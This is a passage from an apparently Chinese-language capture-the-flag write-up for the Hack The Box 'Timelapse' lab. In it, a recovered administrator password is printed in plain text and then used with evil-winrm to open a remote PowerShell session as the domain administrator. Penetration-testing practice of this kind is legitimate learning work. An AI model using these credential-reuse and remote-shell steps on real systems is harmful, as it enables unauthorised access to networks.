ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```

发现 `administrator` 的密码是 `FLUXPLDxIYVs1-ld9}{@gR%(`，尝试登入。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ evil-winrm -i timelapse.htb -S -u administrator -p 'FLUXPLDxIYVs1-ld9}{@gR%('
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```